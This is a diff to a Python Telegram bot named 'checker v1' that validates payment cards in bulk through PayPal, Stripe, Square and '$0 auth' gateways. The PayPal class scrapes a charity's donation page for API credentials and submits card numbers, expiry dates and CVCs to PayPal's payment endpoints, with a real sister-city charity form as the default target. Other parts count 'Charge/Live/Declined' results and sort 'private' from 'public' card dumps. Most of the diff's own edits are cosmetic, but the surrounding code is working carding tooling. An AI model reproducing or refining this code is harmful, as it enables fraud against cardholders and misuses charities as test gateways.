@@ -54,7 +54,7 @@ PREMIUM_EMOJI_IDS = {
     "🏦": "5332455502917949981",
     "🌐": "5447410659077661506",
     "👤": "6041709716231429926",
-    "🛡": "6039615816595414817",
+    "🛡": "5197288647275071607",
     "👑": "6041702032534936873",
     "🔗": "5933844889652432294",
     "📊": "5231200819986047254",
@@ -72,12 +72,29 @@ PREMIUM_EMOJI_IDS = {
     "🎺": "5929509352095354418",
     "👁": "5976794472418121581",
     "💀": "5976323628038363401",
-    "🛑": "6039615816595414817",
-    "🧹": "6039615816595414817",
-    "📁": "6039615816595414817",
-    "🔧": "6039615816595414817",
-    "📤": "6039615816595414817",
-    "📥": "6039615816595414817",
+    "🛑": "5260293700088511294",
+    "🧹": "5260293700088511294",
+    "📁": "5260293700088511294",
+    "🔧": "6026056450223116307",
+    "📤": "6026056450223116307",
+    "📥": "6026056450223116307",
+    "😱": "5222466772061436244",
+    "🎁": "6026316531967726726",
+    "⏸": "6026056450223116307",
+    "💸": "5231449120635370684",
+    "🛍": "5229064374403998351",
+    "🔜": "5440621591387980068",
+    "⏹": "5359543311897998264",
+    "🚬": "6125216237086579378",
+    "😊": "6125216237086579378",
+    "☕": "6125216237086579378",
+    "💻": "6125216237086579378",
+    "🤍": "6125216237086579378",
+    "⭕": "6125216237086579378",
+    "💃": "6125216237086579378",
+    "😒": "6125216237086579378",
+    "🗡": "6125216237086579378",
+    "😠": "6125216237086579378",
 }
 
 def premium_emoji(text):
@@ -197,9 +214,7 @@ class PayPalCommerce:
             self.inurl += f"?{urlparse(self.target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.is_valid_gateway = True
-
         self.paypal_responses = PAYPAL_RESPONSES.copy()
-
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -209,7 +224,6 @@ class PayPalCommerce:
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
         ]
         self.ua_index = 0
-
         self._init_and_extract()
         self._get_access_token()
         self._get_client_token()
@@ -308,7 +322,7 @@ class PayPalCommerce:
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'accept-language': 'en-US,en;q=0.9'
             }
-            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=10)
+            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
             html = response.text
             if self._is_not_paypal_page(html):
@@ -365,7 +379,7 @@ class PayPalCommerce:
             return None
         try:
             headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
-            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=10)
+            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
@@ -381,7 +395,7 @@ class PayPalCommerce:
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                 headers = {'user-agent': self.get_next_ua(), 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
+                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=15)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -431,7 +445,7 @@ class PayPalCommerce:
             for action in actions:
                 params = {'action': action}
                 try:
-                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=10)
+                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                     if response.status_code == 200 and response.text:
                         try:
                             json_data = response.json()
@@ -458,7 +472,7 @@ class PayPalCommerce:
         try:
             headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
             data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=10)
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
                 if 'id' in response_data:
@@ -473,7 +487,7 @@ class PayPalCommerce:
         try:
             headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
             data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=10)
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
                 response_data = response.json()
                 if 'id' in response_data:
@@ -490,7 +504,7 @@ class PayPalCommerce:
         if self.access_token:
             try:
                 headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
-                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=10)
+                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                 return response
             except:
                 pass
@@ -512,7 +526,7 @@ class PayPalCommerce:
             for action in actions:
                 params = {'action': action, 'order': order_id}
                 try:
-                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=10)
+                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                     if response.status_code == 200:
                         return response
                 except:
@@ -586,7 +600,7 @@ class PayPalCommerce:
                 he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
                 da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                 try:
-                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=10)
+                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
                     confirm_text = confirm_res.text
                     if confirm_res.status_code == 200:
                         try:
@@ -677,6 +691,7 @@ async def check_card_api(card_full, gateway_url):
                 pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
                 return pp_engine.Charge(card_full)
             result_raw = await loop.run_in_executor(None, run_check)
+            await asyncio.sleep(0.5)
             result = str(result_raw)
             result_lower = result.lower()
 
@@ -1192,15 +1207,15 @@ async def format_response(card_full, status, response, taken, gateway_url, gatew
         gateway_info = ""
     return premium_emoji(f"""💳 #PayPal [{mode}]
 - - - - - - - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
-⚡ Response: <code>{response}</code>
-{status_emoji} Status: {status_text}
-⏱ Taken: <code>{taken}s</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
+⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
+{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
 - - - - - - - - - - - - - - - - - - - - - -
-📌 Info: <code>{info}</code>
-🏦 Bank: <code>{bank}</code>
-🌐 Country: <code>{country}</code>
-👤 Req By: <code>{user_id}</code> ({user_status}){gateway_info}
+📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
+🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
+🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
+👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status}){gateway_info}
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
@@ -1228,15 +1243,15 @@ async def format_stripe_response(card_full, result, taken, user_id, mode="Single
         user_status = "Free User 🤖"
     return premium_emoji(f"""💳 #Stripe [{mode}]
 - - - - - - - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
-⚡ Response: <code>{result}</code>
-{status_emoji} Status: {status_text}
-⏱ Taken: <code>{taken}s</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
+⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{result}</code>
+{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
 - - - - - - - - - - - - - - - - - - - - - -
-📌 Info: <code>{info}</code>
-🏦 Bank: <code>{bank}</code>
-🌐 Country: <code>{country}</code>
-👤 Req By: <code>{user_id}</code> ({user_status})
+📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
+🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
+🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
+👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
@@ -1260,15 +1275,15 @@ async def format_square_response(card_full, result, taken, user_id, mode="Single
         user_status = "Free User 🤖"
     return premium_emoji(f"""💳 #Square [{mode}]
 - - - - - - - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
-⚡ Response: <code>{result}</code>
-{status_emoji} Status: {status_text}
-⏱ Taken: <code>{taken}s</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
+⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{result}</code>
+{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
 - - - - - - - - - - - - - - - - - - - - - -
-📌 Info: <code>{info}</code>
-🏦 Bank: <code>{bank}</code>
-🌐 Country: <code>{country}</code>
-👤 Req By: <code>{user_id}</code> ({user_status})
+📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
+🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
+🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
+👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
@@ -1294,15 +1309,15 @@ async def format_auth_response(card_full, result_dict, taken, user_id, mode="Sin
         user_status = "Free User 🤖"
     return premium_emoji(f"""🛡 #Auth $0 [{mode}]
 - - - - - - - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
-⚡ Response: <code>{message}</code>
-{status_emoji} Status: {status_text}
-⏱ Taken: <code>{taken}s</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
+⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{message}</code>
+{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
 - - - - - - - - - - - - - - - - - - - - - -
-📌 Info: <code>{info}</code>
-🏦 Bank: <code>{bank}</code>
-🌐 Country: <code>{country}</code>
-👤 Req By: <code>{user_id}</code> ({user_status})
+📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
+🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
+🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
+👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
@@ -1571,17 +1586,17 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
             keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
             
             panel = f"""⚡ {gateway_name}
-🔗 Gate #{gateway_num if gateway_num else 'N/A'}
-⏱ Time: <code>{taken}s</code>
-💬 Response: <code>{response}</code>
+🔗 𝐆𝐚𝐭𝐞 #{gateway_num if gateway_num else 'N/A'}
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
+⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
 - - - - - - - - - - - - - - - -
-🔥 Charge: <code>{approved}</code>
-💵 Live: <code>{live}</code>
-❌ Declined: <code>{declined}</code>
+🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
+💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
+❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
 - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
 - - - - - - - - - - - - - - - -
-📊 Total: <code>{card_counter}/{total_cards}</code>"""
+📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
@@ -1660,17 +1675,17 @@ async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe"
             keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
             
             panel = f"""⚡ {gateway_name}
-🔑 Key #{key_id}
-⏱ Time: <code>{taken}s</code>
-💬 Result: <code>{result[:80]}</code>
+🔑 𝐊𝐞𝐲 #{key_id}
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
+⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{result[:80]}</code>
 - - - - - - - - - - - - - - - -
-🔥 Charge: <code>{approved}</code>
-💵 Live: <code>{live}</code>
-❌ Declined: <code>{declined}</code>
+🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
+💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
+❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
 - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
 - - - - - - - - - - - - - - - -
-📊 Total: <code>{card_counter}/{total_cards}</code>"""
+📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
@@ -1736,16 +1751,16 @@ async def process_square_file(file_path, chat_id, context, gateway_name="Square"
             keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
             
             panel = f"""⚡ {gateway_name}
-⏱ Time: <code>{taken}s</code>
-💬 Result: <code>{result}</code>
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
+⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{result}</code>
 - - - - - - - - - - - - - - - -
-🔥 Charge: <code>{approved}</code>
-💵 Live: <code>{live}</code>
-❌ Declined: <code>{declined}</code>
+🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
+💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
+❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
 - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
 - - - - - - - - - - - - - - - -
-📊 Total: <code>{card_counter}/{total_cards}</code>"""
+📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
@@ -1813,16 +1828,16 @@ async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0",
             keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
             
             panel = f"""⚡ {gateway_name}
-⏱ Time: <code>{taken}s</code>
-💬 Result: <code>{message[:80]}</code>
+⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
+⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{message[:80]}</code>
 - - - - - - - - - - - - - - - -
-🔥 Approved: <code>{approved}</code>
-💵 Live: <code>{live}</code>
-❌ Declined: <code>{declined}</code>
+🔥 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: <code>{approved}</code>
+💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
+❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
 - - - - - - - - - - - - - - - -
-💳 Card: <code>{card_full}</code>
+💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
 - - - - - - - - - - - - - - - -
-📊 Total: <code>{card_counter}/{total_cards}</code>"""
+📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
             except:
@@ -1913,15 +1928,15 @@ async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         private_count = len(valid_cards)
         private_percentage = (private_count / total_lines * 100) if total_lines > 0 else 0
         
-        result_text = f"""🧹 Clean Complete!
+        result_text = f"""🧹 𝐂𝐥𝐞𝐚𝐧 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
 - - - - - - - - - - - - - - - -
-📊 Total cards: <code>{total_lines}</code>
-✅ Private: <code>{private_count}</code>
-❌ Public/Removed: <code>{removed}</code>
-📈 Private percentage: <code>{private_percentage:.1f}%</code>
+📊 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_lines}</code>
+✅ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞: <code>{private_count}</code>
+❌ 𝐏𝐮𝐛𝐥𝐢𝐜/𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
+📈 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐩𝐞𝐫𝐜𝐞𝐧𝐭𝐚𝐠𝐞: <code>{private_percentage:.1f}%</code>
 - - - - - - - - - - - - - - - -
-🧹 Removed: <code>{removed}</code>
-✅ Kept: <code>{private_count}</code>
+🧹 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
+✅ 𝐊𝐞𝐩𝐭: <code>{private_count}</code>
 - - - - - - - - - - - - - - - -
 🤖 checker v1"""
         
@@ -1998,13 +2013,13 @@ async def parts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         username = update.effective_user.username or update.effective_user.first_name or "Unknown"
         
-        result_text = f"""📁 Parts Complete!
+        result_text = f"""📁 𝐏𝐚𝐫𝐭𝐬 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
 - - - - - - - - - - - - - - - -
-⚡ Parts: <code>{num_parts}</code>
-⚡ Lines per part: <code>{cards_per_part}</code>
-⚡ Total cards: <code>{total_cards}</code>
+⚡ 𝐏𝐚𝐫𝐭𝐬: <code>{num_parts}</code>
+⚡ 𝐋𝐢𝐧𝐞𝐬 𝐩𝐞𝐫 𝐩𝐚𝐫𝐭: <code>{cards_per_part}</code>
+⚡ 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_cards}</code>
 - - - - - - - - - - - - - - - -
-⚡ By: @{username}
+⚡ 𝐁𝐲: @{username}
 - - - - - - - - - - - - - - - -
 🤖 checker v1"""
         
